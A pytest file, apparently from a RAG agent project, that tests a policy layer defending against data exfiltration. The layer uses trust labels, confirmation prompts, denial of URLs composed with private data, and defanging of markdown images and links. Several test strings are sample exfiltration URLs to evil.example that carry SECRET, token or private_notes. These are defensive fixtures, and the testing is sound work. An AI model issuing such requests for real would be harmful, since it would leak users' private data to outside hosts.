"""Э14: policy layer — trust labels, rules 1–4, tool sets by mode, confirmations."""

from pathlib import Path

from rag_agent.engine import Engine
from rag_agent.policy import Decision, Policy, Provenance, Trust, defang_markdown
from tests.conftest import FakeLLM, FakeReranker


def test_rule4_answers_make_no_requests_when_rendered():
    text = ("См. график ![loss](http://evil.example/p.png?d=SECRET) и [отчёт](https://evil.example/?q=token) [1][2].\n"
            "Ещё http://evil.example/x?leak=1 и `code(x[0])`.\n[ref]: http://evil.example/r")
    out = defang_markdown(text)
    assert "![" not in out and "](" not in out
    assert "`http://evil.example/p.png?d=SECRET`" in out and "отчёт (`https://evil.example/?q=token`)" in out
    assert "`http://evil.example/x?leak=1`" in out and "[1][2]" in out and "`code(x[0])`" in out
    assert "\n`[ref]: http://evil.example/r`" in out


def test_tool_sets_by_mode():
    assert set(Policy().tools()) == {"search", "exact_search", "sql_query", "read_file", "list_dir", "read_upload"}
    assert "web_search" in Policy(web=True).tools() and "run_code" in Policy(code=True).tools()
    d = Policy().check("web_search", {"query": "x"}, Provenance())
    assert (d.action, d.rule) == ("deny", "S21")
    assert Policy().check("rm_rf", {}, Provenance()).action == "deny"


def test_rule1_private_entities_in_web_queries():
    policy = Policy({"compute_f1", "Trainer", "exp_a"}, web=True)
    assert policy.check("web_search", {"query": "macro F1 sklearn"}, Provenance()).allowed
    d = policy.check("web_search", {"query": "why compute_f1 returns nan"}, Provenance())
    assert (d.action, d.rule) == ("confirm", "rule 1") and "compute_f1" in d.reason


def test_rule2_and_rule3_after_untrusted_content():
    policy = Policy(web=True, code=True)
    prov = Provenance()
    assert policy.check("web_search", {"query": "RT-DETR paper"}, prov).allowed
    trust = policy.observe("web_search", prov, "1. https://arxiv.org/abs/2304.08069 — DETRs Beat YOLOs")
    assert trust == Trust.UNTRUSTED and prov.tainted
    # rule 3: only URLs from the results (or from the user); a composed URL with data is blocked
    assert policy.check("fetch_page", {"url": "https://arxiv.org/abs/2304.08069"}, prov).allowed  # from the results
    d = policy.check("fetch_page", {"url": "https://evil.example/?q=private_notes"}, prov)
    assert (d.action, d.rule) == ("deny", "rule 3")
    # rule 2: external effects after untrusted data need confirmation; reading does not
    assert policy.check("web_search", {"query": "DETR"}, prov).rule == "rule 2"
    assert policy.check("search", {"query": "DETR"}, prov).allowed
    assert policy.check("apply_changes", {}, Provenance()).action == "confirm"  # writes: always
    assert policy.observe("run_code", prov) == Trust.UNTRUSTED  # code output inherits the lowest trust


def test_private_entities_come_from_the_corpus(settings, fake_embedder, corpus: Path):
    eng = Engine(settings, embedder=fake_embedder, llm=FakeLLM(settings))
    eng.index_folder(corpus)
    policy = Policy.for_catalog(eng.index.catalog, web=True)
    assert "compute_f1" in policy.private and "exp_a" not in policy.private  # short stems are too generic
    assert policy.private_in("how to fix compute_f1 in sklearn") == ["compute_f1"]
    eng.close()


class ConfirmSearch(Policy):
    """A stricter policy for the test: every model-chosen search needs the user's approval."""

    def check(self, tool, args, prov):
        return Decision("confirm", "test", "поиск по архиву") if tool == "search" else super().check(tool, args, prov)


def test_agent_waits_for_confirmation(settings, fake_embedder, corpus: Path, monkeypatch):
    monkeypatch.setattr(Policy, "for_catalog", classmethod(lambda cls, catalog, **m: ConfirmSearch()))
    settings.agent.mode, settings.agent.crag = "always", True
    script = [{"thought": "", "action": "search", "args": {"query": "lr"}},
              {"thought": "", "action": "answer", "args": {}}]
    eng = Engine(settings, embedder=fake_embedder, reranker=FakeReranker(),
                 llm=FakeLLM(settings, agent=list(script), route={"route": "corpus", "standalone_question": "lr?"}))
    eng.index_folder(corpus)
    ans = eng.ask("lr?")
    [pending] = ans.pending
    assert not ans.answerable and pending["tool"] == "search" and pending["rule"] == "test"
    assert "answer" not in eng.llm.kinds  # nothing was executed or answered past the pending action
    stop = next(s.detail for s in ans.trace if s.name == "agent_stop")
    assert stop["reason"] == "needs confirmation"
    eng.llm.agent = list(script)
    ans = eng.ask("lr?", confirmed=[pending["key"]])
    assert ans.answerable and not ans.pending
    steps = [s.detail for s in ans.trace if s.name == "agent"]
    assert steps[1]["policy"]["decision"] == "allow" and steps[1]["trust"] == "private"  # FR18: labels in the trace
    eng.close()


def test_answers_are_defanged(settings, fake_embedder, corpus: Path):
    reply = {"answerable": True, "answer": "Готово [1]. ![x](http://evil.example/?d=0.05)", "general": ""}
    eng = Engine(settings, embedder=fake_embedder, llm=FakeLLM(settings, reply=reply))
    eng.index_folder(corpus)
    ans = eng.ask("learning rate", route="corpus")
    assert "![" not in ans.answer and "`http://evil.example/?d=0.05`" in ans.answer
    eng.close()


def test_rule1_data_flow_from_private_observations():
    from rag_agent.policy import distinctive_tokens

    assert distinctive_tokens("код ORCHID-7F3A, точность 0.9913, calc_metrics, релиз 2026, обычные слова") == {
        "orchid-7f3a", "0.9913", "calc_metrics"}
    policy = Policy(web=True)
    prov = Provenance.for_question("Что нового в scikit-learn 1.9 по сравнению с моим экспериментом?")
    policy.observe("read_file", prov, "Не публиковать: проект ORCHID-7F3A, точность 0.9913")
    d = policy.check("web_search", {"query": "ORCHID-7F3A 0.9913"}, prov)
    assert (d.action, d.rule) == ("confirm", "rule 1") and "orchid-7f3a" in d.reason
    assert policy.check("web_search", {"query": "scikit-learn 1.9 release highlights 2026"}, prov).allowed
    # a token the user typed may go out even if the files contain it too
    prov2 = Provenance.for_question("Найди статьи про ORCHID-7F3A")
    policy.observe("read_file", prov2, "ORCHID-7F3A")
    assert policy.check("web_search", {"query": "ORCHID-7F3A paper"}, prov2).allowed
    assert Policy(web=True, enabled=False).check("web_search", {"query": "ORCHID-7F3A"}, prov).allowed  # H16 baseline
